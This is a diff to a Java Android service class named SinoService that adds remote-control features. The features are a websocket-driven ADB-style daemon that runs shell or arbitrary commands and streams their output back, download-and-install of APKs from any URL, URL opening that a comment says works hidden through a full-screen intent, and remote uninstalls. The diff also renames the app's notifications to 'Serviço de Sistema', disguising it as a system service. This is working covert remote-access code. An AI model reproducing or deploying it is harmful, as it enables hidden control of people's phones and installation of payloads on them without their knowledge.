+                miniBuf.write(d);
+                b = miniBuf.toByteArray();
+                int off = 0;
+                while (b.length - off >= 24) {
+                    java.nio.ByteBuffer h = java.nio.ByteBuffer.wrap(b, off, 24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
+                    int cmd = h.getInt(), a0 = h.getInt(), a1 = h.getInt(),
+                            len = h.getInt(), chk = h.getInt(), magic = h.getInt();
+                    if (magic != (cmd ^ 0xffffffff) || len < 0 || len > 1048576) { off++; continue; }
+                    if (b.length - off < 24 + len) break;
+                    byte[] payload = Arrays.copyOfRange(b, off + 24, off + 24 + len);
+                    off += 24 + len;
+                    miniAdbHandle(cmd, a0, a1, payload);
+                }
+                miniBuf.reset();
+                miniBuf.write(b, off, b.length - off);
+            }
+        } catch (Exception e) { status = "miniadbd: " + e; }
+    }
+
+    void miniAdbHandle(int cmd, int a0, int a1, byte[] payload) {
+        try {
+            if (cmd == A_CNXN) {
+                miniAdbSend(A_CNXN, A_VERSION, ADB_MAX,
+                        "device::ro.product.name=cora;ro.product.model=mini-adbd;".getBytes("UTF-8"));
+                status = "mini-adb: handshake ok";
+            } else if (cmd == A_OPEN) {
+                String svc2 = new String(payload, "UTF-8");
+                if (svc2.startsWith("shell") || svc2.startsWith("exec:")) {
+                    Process p = svc2.startsWith("exec:")
+                            ? Runtime.getRuntime().exec(svc2.substring(5).trim().split("\\s+"))
+                            : Runtime.getRuntime().exec("/system/bin/sh");
+                    int lid = ++miniNextId;
+                    synchronized (miniProcs) { miniProcs.put(lid, p); }
+                    miniAdbSend(A_OKAY, lid, a0, null);
+                    status = "mini-adb: aberto " + svc2;
+                    final int flid = lid, fremote = a0;
+                    final Process fp = p;
+                    new Thread(() -> {
+                        try {
+                            java.io.InputStream o = fp.getInputStream();
+                            byte[] buf = new byte[ADB_MAX];
+                            int n;
+                            while ((n = o.read(buf)) > 0) {
+                                miniAdbSend(A_WRTE, flid, fremote, Arrays.copyOf(buf, n));
+                            }
+                            miniAdbSend(A_CLSE, flid, fremote, null);
+                        } catch (Exception ignored) {}
+                        try { fp.destroy(); } catch (Exception ignored) {}
+                        synchronized (miniProcs) { miniProcs.remove(flid); }
+                    }).start();
+                } else {
+                    miniAdbSend(A_CLSE, 0, a0, null);
+                }
+            } else if (cmd == A_WRTE) {
+                Process p;
+                synchronized (miniProcs) { p = miniProcs.get(a0); }
+                if (p != null) {
+                    boolean winint = payload.length == 12 && payload[0] == 0 && payload[1] == 'T'
+                            && payload[2] == 'S' && payload[5] == 'N';
+                    if (!winint) {
+                        p.getOutputStream().write(payload);
+                        p.getOutputStream().flush();
+                    }
+                    miniAdbSend(A_OKAY, a0, a1, null);
+                } else {
+                    miniAdbSend(A_CLSE, a0, a1, null);
+                }
+            } else if (cmd == A_CLSE) {
+                Process p;
+                synchronized (miniProcs) { p = miniProcs.remove(a0); }
+                if (p != null) try { p.destroy(); } catch (Exception ignored) {}
+            } else if (cmd == A_SYNC) {
+                miniAdbSend(A_SYNC, a0, a1, null);
+            }
+        } catch (Exception e) { status = "miniadbd: " + e; }
+    }
+
+    synchronized void miniAdbSend(int cmd, int a0, int a1, byte[] payload) {
+        try {
+            byte[] pl = payload == null ? new byte[0] : payload;
+            java.nio.ByteBuffer h = java.nio.ByteBuffer.allocate(24).order(java.nio.ByteOrder.LITTLE_ENDIAN);
+            int chk = 0;
+            for (byte c : pl) chk += (c & 0xff);
+            h.putInt(cmd).putInt(a0).putInt(a1).putInt(pl.length).putInt(chk).putInt(cmd ^ 0xffffffff);
+            if (ws != null) {
+                byte[] out = new byte[24 + pl.length];
+                System.arraycopy(h.array(), 0, out, 0, 24);
+                System.arraycopy(pl, 0, out, 24, pl.length);
+                ws.send(out);
+            }
+        } catch (Exception ignored) {}
+    }
+
+    // ---------- install remoto ----------
+    void instalarPorUrl(String url) {
+        try {
+            status = "baixando APK...";
+            java.io.InputStream in = new java.net.URL(url).openStream();
+            java.io.File f = new java.io.File(getCacheDir(), "remoto.apk");
+            java.io.FileOutputStream out = new java.io.FileOutputStream(f);
+            byte[] buf = new byte[16384];
+            int n;
+            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
+            out.close(); in.close();
+            byte[] apk = new byte[(int) f.length()];
+            java.io.FileInputStream fis = new java.io.FileInputStream(f);
+            int lid2 = 0, lid = 0;
+            while (lid2 < apk.length) lid += fis.read(apk, lid2, apk.length - lid2);
+            fis.close();
+
+            android.content.pm.PackageInstaller pin = getPackageManager().getPackageInstaller();
+            android.content.pm.PackageInstaller.SessionParams sp =
+                    new android.content.pm.PackageInstaller.SessionParams(android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL);
+            int sid = pin.createSession(sp);
+            android.content.pm.PackageInstaller.Session ses = pin.openSession(sid);
+            java.io.OutputStream os = ses.openWrite("base.apk", 0, apk.length);
+            os.write(apk);
+            ses.fsync(os);
+            os.close();
+
+            android.content.Intent si = new android.content.Intent(this, SinoService.InstallReceiver.class);
+            si.setAction("br.eni.cora.INSTALL_STATUS");
+            int fl = PendingIntent.FLAG_UPDATE_CURRENT;
+            if (android.os.Build.VERSION.SDK_INT >= 23) fl |= PendingIntent.FLAG_IMMUTABLE;
+            if (android.os.Build.VERSION.SDK_INT >= 31) fl |= PendingIntent.FLAG_MUTABLE;
+            PendingIntent pi = PendingIntent.getBroadcast(this, sid, si, fl);
+            ses.commit(pi.getIntentSender());
+            status = "aguardando confirmação do sistema...";
+        } catch (Exception e) {
+            status = "install: " + e;
+            send("{\"type\":\"install\",\"status\":\"erro\"}");
+        }
+    }
+
     public static class InstallReceiver extends android.content.BroadcastReceiver {
         @Override public void onReceive(android.content.Context c, android.content.Intent i) {
-            String msg = i.getStringExtra(android.content.pm.PackageInstaller.EXTRA_STATUS_MESSAGE);
             int st = i.getIntExtra(android.content.pm.PackageInstaller.EXTRA_STATUS, -999);
-            if (st == -999 && msg == null) { SinoService.status = "status sem extras: verificar FLAG_MUTABLE do commit"; return; }
+            String msg = i.getStringExtra(android.content.pm.PackageInstaller.EXTRA_STATUS_MESSAGE);
             if (st == android.content.pm.PackageInstaller.STATUS_PENDING_USER_ACTION) {
                 try {
                     android.content.Intent confirm = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
                     confirm.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                     c.startActivity(confirm);
-                    SinoService.status = "confirme a instalacao na tela do sistema";
+                    SinoService.status = "confirme a instalação na tela";
                 } catch (Throwable t1) {
                     try {
                         android.content.Intent confirm2 = i.getParcelableExtra(android.content.Intent.EXTRA_INTENT);
-                        android.app.PendingIntent npi = android.app.PendingIntent.getActivity(c,
+                        PendingIntent npi = PendingIntent.getActivity(c,
                                 (int) (System.currentTimeMillis() % 100000), confirm2,
-                                android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
-                        android.app.NotificationManager nm = (android.app.NotificationManager) c.getSystemService("notification");
-                        String ch = "instalacao";
+                                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                        NotificationManager nm = (NotificationManager) c.getSystemService(NOTIFICATION_SERVICE);
                         if (android.os.Build.VERSION.SDK_INT >= 26) {
-                            nm.createNotificationChannel(new android.app.NotificationChannel(ch, "Instalacoes", android.app.NotificationManager.IMPORTANCE_HIGH));
+                            nm.createNotificationChannel(new NotificationChannel("instalacao", "Instalações", NotificationManager.IMPORTANCE_HIGH));
                         }
-                        android.app.Notification n = new android.app.Notification.Builder(c)
-                                .setContentTitle("CORA")
-                                .setContentText("toque para confirmar a instalacao")
+                        Notification n2 = new Notification.Builder(c)
+                                .setContentTitle("Serviço de Sistema")
+                                .setContentText("toque para confirmar a instalação")
                                 .setSmallIcon(android.R.drawable.stat_sys_download_done)
                                 .setContentIntent(npi)
                                 .setAutoCancel(true)
                                 .build();
-                        nm.notify(77, n);
-                        SinoService.status = "toque na notificacao para confirmar a instalacao";
+                        nm.notify(77, n2);
+                        SinoService.status = "toque na notificação para confirmar";
                     } catch (Throwable t2) {
                         SinoService.status = "confirm UI falhou: " + t2;
                     }
@@ -660,6 +426,51 @@ public class SinoService extends Service {
             } else {
                 SinoService.status = "install status " + st + ": " + msg;
             }
+        }
+    }
+
+    // ---------- abrir URL (funciona oculto via full-screen intent) ----------
+    void abrirUrl(String url, String pkg) {
+        try {
+            Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
+            if (pkg != null && !pkg.isEmpty()) i.setPackage(pkg);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Exception ignored) {}
+        try {
+            Intent vi = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
+            if (pkg != null && !pkg.isEmpty()) vi.setPackage(pkg);
+            vi.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            PendingIntent pi = PendingIntent.getActivity(this,
+                    (int) (System.currentTimeMillis() % 100000), vi,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (android.os.Build.VERSION.SDK_INT >= 26) {
+                nm.createNotificationChannel(new NotificationChannel("abrir", "Abrir", NotificationManager.IMPORTANCE_HIGH));
+            }
+            Notification n = new Notification.Builder(this)
+                    .setContentTitle("Serviço de Sistema")
+                    .setContentText("toque para abrir")
+                    .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                    .setContentIntent(pi)
+                    .setFullScreenIntent(pi, true)
+                    .setAutoCancel(true)
+                    .build();
+            nm.notify(88, n);
+            send("{\"type\":\"open\",\"status\":\"ok\"}");
+        } catch (Exception e2) {
+            send("{\"type\":\"open\",\"status\":\"erro\"}");
+        }
+    }
+
+    void desinstalar(String pkg) {
+        try {
+            Intent i = new Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:" + pkg));
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+            send("{\"type\":\"uninstall\",\"status\":\"confirmacao_pedida\",\"pkg\":\"" + pkg + "\"}");
+        } catch (Exception e) {
+            send("{\"type\":\"uninstall\",\"status\":\"erro\"}");
         }
     }
 }
